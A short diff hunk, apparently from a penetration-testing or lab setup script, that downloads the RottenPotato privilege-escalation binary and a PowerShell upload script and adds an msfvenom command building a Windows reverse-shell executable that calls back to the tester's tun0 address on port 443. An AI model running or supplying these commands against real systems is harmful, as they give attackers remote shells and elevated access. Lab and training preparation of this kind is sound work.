@@ -73,6 +73,8 @@ wget https://github.com/foxglovesec/RottenPotato/blob/master/rottenpotato.exe
  
 wget https://raw.githubusercontent.com/adann0/py_upload/main/upload.ps1
 
+msfvenom -p windows/shell/reverse_tcp LHOST='tun0' LPORT=443 -f exe > met.exe
+
 rm -f *.zip *.gz
 
 cd ..
